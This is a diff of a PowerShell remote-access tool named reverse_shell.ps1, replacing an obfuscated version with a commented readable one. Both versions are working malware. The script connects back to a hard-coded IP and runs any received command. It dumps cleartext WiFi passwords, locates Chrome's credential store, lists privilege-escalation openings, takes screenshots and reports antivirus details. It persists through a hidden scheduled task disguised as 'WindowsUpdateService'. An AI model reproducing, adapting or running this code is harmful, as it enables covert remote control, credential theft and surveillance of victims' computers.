@@ -1,67 +1,82 @@
-# reverse_shell.ps1 - Obfuscated persistent reverse shell
-${_} = "147.185.221.31"; ${__} = 47034; ${___} = 15; ${____} = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
+# reverse_shell.ps1 - Persistent reverse shell with advanced features
+$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
+$serverPort = 47034
+$reconnectDelay = 15  # Seconds to wait before reconnecting
+$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
 
-function ${______} {
-    ${_____} = $env:COMPUTERNAME; ${_______} = $env:USERNAME
-    ${________} = (Get-WmiObject Win32_OperatingSystem).Caption
-    ${_________} = (Get-WmiObject Win32_ComputerSystem).Domain
-    ${__________} = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
-    ${___________} = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName
-    return "SYSINFO:${_____}|${_______}|${________}|${_________}|${__________}|${___________}"
+# Function to get detailed system information
+function Get-SystemInfo {
+    $hostname = $env:COMPUTERNAME
+    $username = $env:USERNAME
+    $os = (Get-WmiObject Win32_OperatingSystem).Caption
+    $domain = (Get-WmiObject Win32_ComputerSystem).Domain
+    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
+    $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName
+    return "SYSINFO:$hostname|$username|$os|$domain|$ipAddress|$antivirus"
 }
 
-function ${____________} {
-    ${_____________} = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-    ${______________} = @()
+# Function to dump WiFi passwords
+function Get-WifiPasswords {
+    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
+    $results = @()
     
-    foreach (${_______________} in ${_____________}) {
-        ${________________} = netsh wlan show profile name="${_______________}" key=clear
-        ${_________________} = (${________________} | Select-String "Key Content").ToString().Split(":")[1].Trim()
-        ${______________} += "WIFI:${_______________}|${_________________}"
+    foreach ($profile in $wifiProfiles) {
+        $profileInfo = netsh wlan show profile name="$profile" key=clear
+        $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
+        $results += "WIFI:$profile|$password"
     }
     
-    return ${______________} -join "`n"
+    return $results -join "`n"
 }
 
-function ${__________________} {
-    ${___________________} = @()
+# Function to dump browser credentials (Chrome)
+function Get-BrowserCredentials {
+    $results = @()
     
     try {
-        ${____________________} = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path ${____________________}) {
-            ${___________________} += "CHROME:Credentials found at ${____________________} (decryption required)"
+        # Chrome credentials path
+        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromePath) {
+            # This is a simplified approach - real implementation would require SQLite and decryption
+            $results += "CHROME:Credentials found at $chromePath (decryption required)"
         }
     } catch { }
 
-    return ${___________________} -join "`n"
+    return $results -join "`n"
 }
 
-function ${_____________________} {
-    ${______________________} = @()
+# Function to check for privilege escalation vectors
+function Get-PrivEscVectors {
+    $results = @()
     
-    ${_______________________} = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
-    foreach (${________________________} in ${_______________________}) {
-        ${______________________} += "PRIVESC:Unquoted service path - $(${________________________}.Name): $(${________________________}.PathName)"
+    # Check for unquoted service paths
+    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
+    foreach ($service in $services) {
+        $results += "PRIVESC:Unquoted service path - $($service.Name): $($service.PathName)"
     }
     
-    ${_________________________} = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
-    if (${_________________________} -eq 1) {
-        ${______________________} += "PRIVESC:AlwaysInstallElevated enabled"
+    # Check for always install elevated
+    $alwaysInstallElevated = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
+    if ($alwaysInstallElevated -eq 1) {
+        $results += "PRIVESC:AlwaysInstallElevated enabled"
     }
     
-    return ${______________________} -join "`n"
+    return $results -join "`n"
 }
 
-function ${__________________________} {
+# Function to establish persistence
+function Set-Persistence {
     try {
-        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination ${____} -Force
+        # Copy self to persistent location
+        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $localPayloadPath -Force
         
-        ${___________________________} = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"${____}`""
-        ${____________________________} = New-ScheduledTaskTrigger -AtLogOn
-        ${_____________________________} = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
-        ${______________________________} = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-        ${_______________________________} = New-ScheduledTask -Action ${___________________________} -Trigger ${____________________________} -Principal ${_____________________________} -Settings ${______________________________}
-        Register-ScheduledTask -TaskName "WindowsUpdateService" -InputObject ${_______________________________} -Force
+        # Create scheduled task for persistence
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
+        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+        Register-ScheduledTask -TaskName "WindowsUpdateService" -InputObject $task -Force
         
         return "PERSISTENCE:Scheduled task created successfully"
     } catch {
@@ -69,84 +84,94 @@ function ${__________________________} {
     }
 }
 
-function ${________________________________} {
+# Function to take a screenshot
+function Get-Screenshot {
     try {
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
         
-        ${_________________________________} = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        ${__________________________________} = New-Object System.Drawing.Bitmap ${_________________________________}.Width, ${_________________________________}.Height
-        ${___________________________________} = [System.Drawing.Graphics]::FromImage(${__________________________________})
-        ${___________________________________}.CopyFromScreen(${_________________________________}.X, ${_________________________________}.Y, 0, 0, ${__________________________________}.Size)
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
         
-        ${____________________________________} = New-Object System.IO.MemoryStream
-        ${__________________________________}.Save(${____________________________________}, [System.Drawing.Imaging.ImageFormat]::Png)
-        ${_____________________________________} = ${____________________________________}.ToArray()
-        ${______________________________________} = [Convert]::ToBase64String(${_____________________________________})
+        $memoryStream = New-Object System.IO.MemoryStream
+        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
+        $bytes = $memoryStream.ToArray()
+        $base64 = [Convert]::ToBase64String($bytes)
         
-        ${___________________________________}.Dispose()
-        ${__________________________________}.Dispose()
-        ${____________________________________}.Dispose()
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        $memoryStream.Dispose()
         
-        return "SCREENSHOT:${______________________________________}"
+        return "SCREENSHOT:$base64"
     } catch {
         return "SCREENSHOT:Error - $($_.Exception.Message)"
     }
 }
 
-function ${_______________________________________} {
-    param(${________________________________________})
+# Function to handle special commands
+function Invoke-SpecialCommand {
+    param($Command)
     
-    switch -Regex (${________________________________________}) {
-        "^!wifi" { return ${____________} }
-        "^!browsers" { return ${__________________} }
-        "^!privesc" { return ${_____________________} }
-        "^!persist" { return ${__________________________} }
-        "^!screenshot" { return ${________________________________} }
-        "^!sysinfo" { return ${______} }
+    switch -Regex ($Command) {
+        "^!wifi" { return Get-WifiPasswords }
+        "^!browsers" { return Get-BrowserCredentials }
+        "^!privesc" { return Get-PrivEscVectors }
+        "^!persist" { return Set-Persistence }
+        "^!screenshot" { return Get-Screenshot }
+        "^!sysinfo" { return Get-SystemInfo }
         default { return "ERROR:Unknown special command" }
     }
 }
 
+# Main persistent loop (NEVER EXITS)
 while ($true) {
     try {
-        ${_________________________________________} = New-Object System.Net.Sockets.TCPClient
-        ${_________________________________________}.Connect(${_}, ${__})
+        $client = New-Object System.Net.Sockets.TCPClient
+        $client.Connect($serverIP, $serverPort)
         
-        ${__________________________________________} = ${_________________________________________}.GetStream()
-        ${___________________________________________} = New-Object System.IO.StreamWriter(${__________________________________________})
-        ${___________________________________________}.AutoFlush = $true
-        ${____________________________________________} = New-Object System.IO.StreamReader(${__________________________________________})
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.AutoFlush = $true
+        $reader = New-Object System.IO.StreamReader($stream)
         
-        ${___________________________________________}.WriteLine((${______}))
+        # Send system info upon connection
+        $writer.WriteLine((Get-SystemInfo))
         
+        # Command execution loop
         while ($true) {
             try {
-                ${_____________________________________________} = ${____________________________________________}.ReadLine()
-                if (-not ${_____________________________________________}) { break }
+                $command = $reader.ReadLine()
+                if (-not $command) { break }  # Server closed connection
                 
-                if (${_____________________________________________} -eq "exit") { break }
+                if ($command -eq "exit") { break }
                 
-                if (${_____________________________________________} -match "^!") {
-                    ${______________________________________________} = ${_______________________________________} ${_____________________________________________}
-                    ${___________________________________________}.WriteLine(${______________________________________________})
+                # Check if it's a special command
+                if ($command -match "^!") {
+                    $result = Invoke-SpecialCommand $command
+                    $writer.WriteLine($result)
                     continue
                 }
                 
-                ${_______________________________________________} = iex ${_____________________________________________} 2>&1 | Out-String
-                ${___________________________________________}.WriteLine(${_______________________________________________})
+                # Execute regular command
+                $result = iex $command 2>&1 | Out-String
+                $writer.WriteLine($result)
             }
             catch {
-                ${________________________________________________} = "ERROR: $($_.Exception.Message)`n"
-                ${___________________________________________}.WriteLine(${________________________________________________})
+                # Send error but KEEP CONNECTION ALIVE
+                $errorOutput = "ERROR: $($_.Exception.Message)`n"
+                $writer.WriteLine($errorOutput)
             }
         }
     }
     catch {
+        # Connection failed, but we'll retry
     }
     finally {
-        if (${_________________________________________}) { ${_________________________________________}.Close() }
+        if ($client) { $client.Close() }
     }
     
-    Start-Sleep -Seconds ${___}
+    # Wait before reconnecting
+    Start-Sleep -Seconds $reconnectDelay
 }
